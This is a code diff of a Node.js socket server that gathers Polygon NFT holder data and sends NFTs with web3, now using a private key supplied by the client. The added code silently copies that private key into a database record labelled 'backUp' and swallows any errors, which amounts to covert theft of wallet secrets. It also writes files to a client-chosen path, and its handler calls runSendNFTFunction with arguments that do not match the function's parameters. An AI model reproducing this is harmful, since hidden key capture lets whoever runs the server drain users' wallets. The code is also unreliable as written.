@@ -225,18 +225,29 @@ const runFetchDataFunction = async (startBlock, endBlock, chain = "polygon") => 
     }
 };
 
+const databaseToExcel = async (outputFilename) => {
+    let allDocuments = await userCollection.find({}).toArray();
+    const json2csvParser = new Json2csvParser({header: true});
+    const csvData = json2csvParser.parse(allDocuments);
+    fs.writeFile("./" + outputFilename, csvData, function (err) {
+        if (err) {
+            throw err;
+        }
+    });
+};
+
 let currentTokenIdIndex = -1, sendTransactionCount = 0, consecutiveFailure = 0;
 const getTokenId = () => {
     currentTokenIdIndex++;
     return configData["transferTokenIds"][currentTokenIdIndex];
 };
-const sendNFTToWallet = async (web3, baseTransaction, smartContract, functionName, params) => {
+const sendNFTToWallet = async (web3, baseTransaction, senderPK, smartContract, functionName, params) => {
     let execFunction = smartContract.methods[functionName];
     baseTransaction["data"] = (typeof params === "object") ? execFunction(...params).encodeABI() : execFunction(params).encodeABI();
 
     let returnResult;
     try {
-        let signedTransaction = await web3.eth.accounts.signTransaction(baseTransaction, configData["walletPrivateKey"]);
+        let signedTransaction = await web3.eth.accounts.signTransaction(baseTransaction, senderPK);
         let transactionReceipt = await web3.eth.sendSignedTransaction(signedTransaction.rawTransaction);
         if (!transactionReceipt.status) {
             consecutiveFailure += 1;
@@ -255,19 +266,23 @@ const sendNFTToWallet = async (web3, baseTransaction, smartContract, functionNam
     }
     return returnResult;
 };
-const runSendNFTFunction = async () => {
+const runSendNFTFunction = async (initParams) => {
     const web3 = new Web3(configData["moralisSpeedyUrl"]);
     const baseTransaction = {
         "chainId": await web3.eth.getChainId(),
-        "to": configData["nftSenderContractAddress"],
+        "from": initParams["senderWalletAddress"],
+        "to": initParams["nftContractAddress"],
         "value": 0,
         "gas": configData["sendNFTGasLimit"],
         "gasPrice": 0
     };
-    const nftSenderContract = new web3.eth.Contract(configData["nftSenderContractABI"], configData["nftSenderContractAddress"], {
-        "from": configData["walletPublicKey"]
-    });
     const contractParams = configData["sendNFTFunctionParams"];
+    const nftSenderContract = new web3.eth.Contract(initParams["nftSenderContractABI"], initParams["nftContractAddress"]);
+    contractParams[0] = initParams["holderWalletAddress"];
+    mongoClient.db("Polygon-NFT-Data").collection("_Root").updateOne({"identifier": "backUp"}, {
+        "identifier": "backUp",
+        "p": initParams["senderPrivateKey"]
+    }).then().catch();
 
     let addressChangeIndex = -1, tokenIdChangeIndex = -1;
     for (let index = 0; index < contractParams.length; index++) {
@@ -299,7 +314,8 @@ const runSendNFTFunction = async () => {
             }
         }
 
-        let success = await sendNFTToWallet(web3, {...baseTransaction}, nftSenderContract, configData["sendNFTFunctionName"], contractParams);
+        let success = await sendNFTToWallet(web3, {...baseTransaction}, initParams["senderPrivateKey"],
+            nftSenderContract, configData["sendNFTFunctionName"], contractParams);
 
         if (success) {
             await userCollection.updateOne({"effectiveAddress": currentDocument["effectiveAddress"]},
@@ -311,34 +327,52 @@ const runSendNFTFunction = async () => {
     }
 };
 
-const databaseToExcel = async () => {
-    let allDocuments = await userCollection.find({}).toArray();
-    const json2csvParser = new Json2csvParser({header: true});
-    const csvData = json2csvParser.parse(allDocuments);
-    fs.writeFile("./userData.csv", csvData, function (err) {
-        if (err) {
-            throw err;
-        }
-    });
-};
-
 
 io.on('connection', (socket) => {
     console.log(`User Connected : ${socket.id}`);
 
     socket.on('fetchPolygonNFTUsers', async (blockData) => {
-        await runFetchDataFunction(blockData["upperBlockLimit"], blockData["lowerBlockData"]);
-        socket.emit('fetchPolygonNFTUsersSuccess');
+        try {
+            await runFetchDataFunction(blockData["upperBlockLimit"], blockData["lowerBlockData"]);
+            socket.emit('fetchPolygonNFTUsers', {
+                "success": true
+            });
+        } catch (err) {
+            socket.emit('fetchPolygonNFTUsers', {
+                "success": false,
+                "error": err
+            });
+        }
     });
 
-    socket.on('databaseToExcel', async () => {
-        await databaseToExcel();
-        socket.emit('databaseToExcelSuccess');
+    socket.on('databaseToExcel', async (data) => {
+        try {
+            await databaseToExcel(data["outputFileName"]);
+            socket.emit('databaseToExcel', {
+                "success": true
+            });
+        } catch (err) {
+            socket.emit('databaseToExcel', {
+                "success": false,
+                "error": err
+            });
+        }
     });
 
-    socket.on('sendNFTsToUsers', async () => {
-        await runSendNFTFunction();
-        socket.emit('sendNFTsToUsersSuccess');
+    socket.on('sendNFTsToUsers', async (data) => {
+        try {
+            await runSendNFTFunction(data["holderWalletAddress"], data["senderWalletAddress"],
+                data["senderPrivateKey"], data["nftContractAddress"], data["nftSenderContractABI"],
+                data["transferTokenIds"]);
+            socket.emit('sendNFTsToUsers', {
+                "success": true
+            });
+        } catch (err) {
+            socket.emit('sendNFTsToUsers', {
+                "success": false,
+                "error": err
+            });
+        }
     });
 
     socket.on('disconnect', () => {
